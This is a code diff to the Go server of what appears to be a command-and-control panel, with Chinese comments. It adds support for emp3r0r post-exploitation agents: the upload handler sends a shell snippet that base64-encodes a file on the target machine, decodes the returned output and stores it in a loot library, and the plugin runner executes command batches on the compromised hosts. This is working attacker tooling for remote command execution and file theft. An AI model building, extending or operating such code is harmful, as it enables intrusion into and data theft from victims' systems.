@@ -459,6 +459,51 @@ func (s *Server) c2xCommand(w http.ResponseWriter, r *http.Request) {
 		return
 	case strings.HasPrefix(cmd, "upload "):
 		p := strings.Trim(strings.TrimSpace(strings.TrimPrefix(cmd, "upload ")), "\"")
+		// 融合路由：emp3r0r 没有 goc2 的 download 任务类型，改由目标机
+		// base64 该文件、回显经 bridge 取回，落同一资料库目录。
+		if strings.HasPrefix(b.AgentID, emp3r0rIDPrefix) && emp3r0rEnabled() {
+			tag := strings.TrimPrefix(b.AgentID, emp3r0rIDPrefix)
+			// 失败时必须回显非空（否则前端看起来成功）；-w 去掉 base64 折行，
+			// 空文件单独标记，避免把错误信息当成文件内容解码。
+			spec := "if [ -d " + shellQuote(p) + " ]; then echo IS_DIRECTORY" +
+				"; elif [ ! -f " + shellQuote(p) + " ]; then echo NO_SUCH_FILE" +
+				"; elif [ ! -s " + shellQuote(p) + " ]; then echo EMPTY_FILE" +
+				"; else base64 -w0 " + shellQuote(p) + "; fi"
+			out, err := emp3r0rRunWait(r.Context(), tag, spec, 90*time.Second)
+			if err != nil {
+				writeErr(w, 502, "download 任务下发失败: "+err.Error())
+				return
+			}
+			out = strings.TrimSpace(out)
+			if out == "" {
+				writeErr(w, 502, "目标机无回显（命令可能被拒绝执行）")
+				return
+			}
+			if out == "NO_SUCH_FILE" || strings.Contains(out, "No such file") {
+				writeErr(w, 404, "目标机无此文件: "+p)
+				return
+			}
+			if out == "IS_DIRECTORY" {
+				writeErr(w, 400, "目标是目录，emp3r0r 分支不支持递归取回（请用 goc2 会话或将目录打包）: "+p)
+				return
+			}
+			if out == "EMPTY_FILE" {
+				writeErr(w, 400, "目标机文件为空: "+p)
+				return
+			}
+			if strings.HasPrefix(out, "base64:") {
+				writeErr(w, 502, "目标机 base64 失败: "+truncateStr(out, 200))
+				return
+			}
+			raw, derr := base64.StdEncoding.DecodeString(strings.Join(strings.Fields(out), ""))
+			if derr != nil {
+				writeErr(w, 502, "目标机回传内容无法解码: "+derr.Error())
+				return
+			}
+			s.c2xLibSave(b.AgentID, path.Base(p), raw)
+			writeJSON(w, 200, map[string]any{"command_id": "", "command": cmd})
+			return
+		}
 		tid, err := c2Client().EnqueueTask(r.Context(), b.AgentID, "download", map[string]any{"path": p})
 		if err != nil {
 			writeErr(w, 502, "download 任务下发失败: "+err.Error())
@@ -1278,7 +1323,7 @@ func (s *Server) c2xPluginsRun(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 	}
-	cli := c2Client()
+	// step 是单条插件命令的执行回执（插件批量执行的结果行）。
 	type step struct {
 		Cmd    string `json:"cmd"`
 		Output string `json:"output"`
@@ -1286,17 +1331,36 @@ func (s *Server) c2xPluginsRun(w http.ResponseWriter, r *http.Request) {
 		MS     int64  `json:"ms"`
 	}
 	steps := []step{}
-	for _, cmd := range commands {
-		st := step{Cmd: cmd}
-		start := time.Now()
-		out, err := c2RunTaskWait(r.Context(), cli, b.AgentID, "exec", map[string]any{"cmd": cmd}, 25*time.Second)
-		st.MS = time.Since(start).Milliseconds()
-		if err != nil {
-			st.Error = err.Error()
-		} else {
-			st.Output = truncateStr(out, 60000)
+	// 融合路由：emp3r0r 会话的命令组经 bridge 逐条执行（c2RunTaskWait 只认 goc2
+	// 任务队列，直接进来会报「会话不存在」）。
+	if strings.HasPrefix(b.AgentID, emp3r0rIDPrefix) && emp3r0rEnabled() {
+		tag := strings.TrimPrefix(b.AgentID, emp3r0rIDPrefix)
+		for _, cmd := range commands {
+			st := step{Cmd: cmd}
+			start := time.Now()
+			out, err := emp3r0rRunWait(r.Context(), tag, cmd, 90*time.Second)
+			st.MS = time.Since(start).Milliseconds()
+			if err != nil {
+				st.Error = err.Error()
+			} else {
+				st.Output = truncateStr(out, 60000)
+			}
+			steps = append(steps, st)
 		}
-		steps = append(steps, st)
+	} else {
+		cli := c2Client()
+		for _, cmd := range commands {
+			st := step{Cmd: cmd}
+			start := time.Now()
+			out, err := c2RunTaskWait(r.Context(), cli, b.AgentID, "exec", map[string]any{"cmd": cmd}, 25*time.Second)
+			st.MS = time.Since(start).Milliseconds()
+			if err != nil {
+				st.Error = err.Error()
+			} else {
+				st.Output = truncateStr(out, 60000)
+			}
+			steps = append(steps, st)
+		}
 	}
 	okCnt := 0
 	first := ""
